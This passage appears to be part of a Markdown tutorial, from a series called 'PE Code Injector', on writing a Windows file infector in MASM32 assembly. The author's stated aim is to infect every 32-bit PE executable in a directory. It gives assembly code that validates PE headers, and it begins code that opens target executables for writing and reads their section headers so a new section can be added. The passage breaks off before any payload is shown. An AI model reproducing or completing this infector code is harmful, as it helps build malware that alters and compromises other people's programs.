# A. Preparation

1. **Program Language**

Since I am using with Assembly in Windows, we should install MASM32 package [here](https://masm32.com/) to use the Windows library

In this chapter, I am using MASM32 macros so it looks like C code in some ways

2. **The idea**

To infect all PE32 within a directory, my idea was below:

![](https://github.com/0r3o-r3vEr5e/Episode-2-PE-Code-Injector/blob/main/Images/Idea.png)

Now let's start coding!

# B. Coding Time

## I. Check if a file is PE32 or not?

To do this, we need to check 3 things of a file:

- `e_magic` in `DOS Header`
- `Signature` in `NT Headers`
- `Magic` in `Optional Header`

And the `proc` should be like this:

```asm
.386
option casemap :none

INCLUDE \masm32\include\masm32rt.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
INCLUDELIB \masm32\lib\masm32.lib

.data
    hFile dd ?
    bytesRead dd ?
    DOSHeader IMAGE_DOS_HEADER <>
    PEHeader IMAGE_NT_HEADERS <>

.code
isPE32 proc filename:DWORD
    invoke CreateFile, filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    mov hFile, eax
    .if hFile == INVALID_HANDLE_VALUE
        xor eax, eax
        ret
    .endif

    ; Check e_magic in DOS Header
    invoke ReadFile, hFile, addr DOSHeader, sizeof IMAGE_DOS_HEADER, addr bytesRead, NULL
    .if DOSHeader.e_magic != IMAGE_DOS_SIGNATURE
        jmp _exit
    .endif

    ; Check Signature in NT Headers
    invoke SetFilePointer, hFile, DOSHeader.e_lfanew, NULL, FILE_BEGIN
    invoke ReadFile, hFile, addr PEHeader, sizeof IMAGE_NT_HEADERS, addr bytesRead, NULL
    .if PEHeader.Signature != IMAGE_NT_SIGNATURE
        jmp _exit
        
    .endif

    ; Check Magic in Optional Header
    .if (PEHeader.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC)
        jmp _exit
    .endif
    invoke CloseHandle, hFile
    mov eax, 1
    ret

_exit:
    invoke CloseHandle, hFile
    xor eax, eax
    ret

isPE32 endp
```

> **Tips:**
> You can print out message in certain places for debugging. I had to do it since I couldn't file any appropriate debuggers for MASM32 

## II. Add Section

I was trying to code this function like the C++ code in Chapter 1. But I am not good at handling pointer in Assembly :<< 
=> So my idea was set file pointer properly to read file to store headers in structures, edit those structures and then write into the file. Now just break down this into some smaller tasks.

#### 1. Store Headers

I am using ReadFile(), SetFilePointer() to do this
(As I mentioned, I am sucks at handling pointers in MASM)

```asm
.data
    hFile dd ?
    bytesRead dd ?
    bytesWritten dd ?
    DOSHeader IMAGE_DOS_HEADER <>
    PEHeader IMAGE_NT_HEADERS <>
    lastSectionHeader IMAGE_SECTION_HEADER <>
    newSectionHeader IMAGE_SECTION_HEADER <>

.code
addSection proc filename:DWORD
    ; Open file
    invoke CreateFile, filename, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL

    ; Get DOS Header
    mov hFile, eax
    invoke ReadFile, hFile, addr DOSHeader, sizeof IMAGE_DOS_HEADER, addr bytesRead, NULL
    

    ; Get NT Headers
    invoke SetFilePointer, hFile, DOSHeader.e_lfanew, NULL, FILE_BEGIN
    invoke ReadFile, hFile, addr PEHeader, sizeof IMAGE_NT_HEADERS, addr bytesRead, NULL

    ; Get the last section header
    movzx ecx, PEHeader.FileHeader.NumberOfSections
    imul ecx, ecx, sizeof IMAGE_SECTION_HEADER
    sub ecx, sizeof IMAGE_SECTION_HEADER

    invoke SetFilePointer, hFile, ecx, NULL, FILE_CURRENT
    invoke ReadFile, hFile, addr lastSectionHeader, sizeof IMAGE_SECTION_HEADER, addr bytesRead, NULL

```

> **Why am I getting data of the last section?**
> I need to calculate some data fields of the `newSectionHeader`, which depends on the data stored in `lastSectionHeader`.
